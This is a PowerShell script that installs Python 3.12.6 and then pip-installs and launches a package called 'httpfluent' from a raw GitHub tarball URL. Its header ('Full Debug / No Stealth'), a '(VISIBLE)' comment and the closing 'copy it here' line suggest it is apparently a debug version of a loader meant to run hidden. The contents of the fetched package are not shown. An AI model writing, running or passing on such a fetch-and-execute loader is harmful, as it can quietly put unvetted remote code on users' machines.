# ===================================================
# Python 3.12.6 + httpfluent (Full Debug / No Stealth)
# ===================================================

$InstallDir = "$env:LOCALAPPDATA\Programs\Python\Python312"
$PythonExe = Join-Path $InstallDir "python.exe"
$InstallRequired = $true

Write-Host "--- CHECKING ENVIRONMENT ---" -ForegroundColor Cyan

# 0. Check if Python is already here
if (Get-Command python -ErrorAction SilentlyContinue) {
    $CheckPath = "python"
} elseif (Test-Path $PythonExe) {
    $CheckPath = $PythonExe
}

if ($CheckPath) {
    $VersionString = & $CheckPath --version 2>&1
    Write-Host "[DEBUG] Python check result: $VersionString"
    if ($VersionString -match "Python (\d+\.\d+\.\d+)") {
        $Ver = [version]$Matches[1]
        if ($Ver -ge [version]"3.9") {
            Write-Host "[+] Python $Ver found. Skipping Install." -ForegroundColor Green
            $InstallRequired = $false
            $ExecutableToUse = $CheckPath
        }
    }
}

# --- YOUR ALGORITHM (VISIBLE) ---
if ($InstallRequired) {
    Write-Host "--- DOWNLOADING PYTHON ---" -ForegroundColor Cyan
    $PythonVersion = "3.12.6"
    $DownloadUrl = "https://www.python.org/ftp/python/$PythonVersion/python-$PythonVersion-amd64.exe"
    $DownloadDir = "$env:TEMP\Python"
    if (-not (Test-Path $DownloadDir)) { New-Item -ItemType Directory -Path $DownloadDir }
    $InstallerPath = Join-Path $DownloadDir "python-installer.exe"
    
    Write-Host "[*] Downloading from: $DownloadUrl"
    Invoke-WebRequest -Uri $DownloadUrl -OutFile $InstallerPath -UseBasicParsing
    Write-Host "[+] Download finished."

    Write-Host "--- INSTALLING PYTHON ---" -ForegroundColor Cyan
    Write-Host "[*] Starting installer window... (Check taskbar if it doesn't appear)"
    # Removed /quiet so you can see the installer if it fails
    $p = Start-Process -FilePath $InstallerPath -ArgumentList "/passive InstallAllUsers=0 PrependPath=1 TargetDir=`"$InstallDir`"" -Wait -PassThru
    Write-Host "[DEBUG] Installer finished with Exit Code: $($p.ExitCode)"

    Write-Host "--- REFRESHING PATH ---" -ForegroundColor Cyan
    $OldPath = [Environment]::GetEnvironmentVariable("Path","User")
    $NewPath = "$InstallDir;$InstallDir\Scripts;" + ($OldPath -replace [regex]::Escape("$env:LOCALAPPDATA\Microsoft\WindowsApps;"),"")
    [Environment]::SetEnvironmentVariable("Path",$NewPath,"User")
    $env:Path = $NewPath
    $ExecutableToUse = $PythonExe
}

Write-Host "--- INSTALLING PACKAGES ---" -ForegroundColor Cyan
Write-Host "[*] Updating Pip..."
& $ExecutableToUse -m pip install --upgrade pip

Write-Host "[*] Installing Requests..."
& $ExecutableToUse -m pip install requests

Write-Host "[*] Installing httpfluent..."
& $ExecutableToUse -m pip install "https://github.com/httpfluent/Intranetflow/raw/main/v1.0/httpfluent-0.1.tar.gz"

Write-Host "--- LAUNCHING httpfluent ---" -ForegroundColor Cyan
Write-Host "[*] Attempting direct command launch: httpfluent"

# This uses -NoExit so the window stays open for you to read
Start-Process powershell -ArgumentList "-NoExit -Command httpfluent"

Write-Host "--- CLEANUP ---" -ForegroundColor Cyan
if (Test-Path "$env:TEMP\Python") {
    Remove-Item "$env:TEMP\Python" -Recurse -Force
}

Write-Host "[FINISHED] If the second window shows an error, copy it here." -ForegroundColor Cyan
